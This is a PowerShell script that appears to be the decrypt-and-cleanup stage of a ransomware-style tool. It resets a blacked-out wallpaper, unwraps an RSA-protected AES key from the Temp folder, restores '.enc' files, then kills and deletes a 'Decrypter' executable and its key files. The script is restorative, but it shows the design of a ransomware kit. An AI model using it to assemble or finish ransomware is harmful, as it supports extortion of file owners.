# Paths ------------------------
$tempPath = [System.IO.Path]::Combine([System.Environment]::GetEnvironmentVariable("SystemRoot"), "Temp")
$privateKeyFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Wallpaper")
$folderToDecrypt = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Wallpaper")
$decrypterFolder = [System.Environment]::GetFolderPath('Desktop')
# ------------------------------

# Reset the desktop background to the default wallpaper
$setWallpaperSrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
    public const int SetDesktopWallpaper = 20;
    public const int UpdateIniFile = 0x01;
    public const int SendWinIniChange = 0x02;

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public static void SetWallpaper(string path)
    {
        SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
    }
}
"@
Add-Type -TypeDefinition $setWallpaperSrc
$windowsPath = [System.Environment]::GetFolderPath("Windows")
$wallpaperPath = Join-Path -Path $windowsPath -ChildPath "Web\Wallpaper\Windows\img0.jpg"
[Wallpaper]::SetWallpaper($wallpaperPath)

# Remove the temporary black wallpaper file
Remove-Item -Path "$tempPath\black.jpg" -Force

# ----- Decryption ----- 

# Function to decrypt a file using AES
function Decrypt-File {
    param (
        [string]$inputFile, 
        [string]$outputFile, 
        [byte[]]$key        
    )

    # Initialize AES for decryption
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Open the input encrypted file and read the IV
    $fsInput = [System.IO.File]::OpenRead($inputFile)
    $iv = New-Object byte[] 16
    $fsInput.Read($iv, 0, $iv.Length)

    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()

    # Create the output file and initialize decryption stream
    $fsOutput = [System.IO.File]::Create($outputFile)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fsInput, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

    # Decrypt the data in chunks and write to the output file
    $buffer = New-Object byte[] 4096
    $bytesRead = 0

    while (($bytesRead = $cryptoStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $fsOutput.Write($buffer, 0, $bytesRead)
    }

    # Close the streams and dispose of AES object
    $cryptoStream.Close()
    $fsInput.Close()
    $fsOutput.Close()
    $aes.Dispose()

    # Remove the encrypted input file after decryption
    Remove-Item -Path $inputFile
}

# Import the private RSA key for decrypting the AES key
$privateKeyPath = Join-Path -Path $privateKeyFolder -ChildPath "privateKey.xml"
$privateKeyXml = [System.IO.File]::ReadAllText($privateKeyPath)
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
$rsa.FromXmlString($privateKeyXml)

# Decrypt the AES key using the private RSA key
$encryptedAESKeyPath = Join-Path -Path $tempPath -ChildPath "encrypted_AES_Key.bin"
$encryptedAESKey = [System.IO.File]::ReadAllBytes($encryptedAESKeyPath)
$aesKey = $rsa.Decrypt($encryptedAESKey, $false)
$rsa.Dispose()

# Decrypt all encrypted files in the specified folder
Get-ChildItem -Path $folderToDecrypt -Filter "*.enc" | ForEach-Object {
    $outputFile = [System.IO.Path]::Combine($folderToDecrypt, $_.BaseName)
    Decrypt-File -inputFile $_.FullName -outputFile $outputFile -key $aesKey
}

# ---------------------

# Stop the Decrypter process
Stop-Process -Name "Decrypter" -Force

Start-Sleep 2

# Delete the Decrypter executable and cleanup temporary files
$decrypterPath = Join-Path -Path $decrypterFolder -ChildPath "Decrypter.exe"
Remove-Item -Path $decrypterPath -Force
Remove-Item -Path "$tempPath\c.txt" -Force
Remove-Item -Path $encryptedAESKeyPath -Force
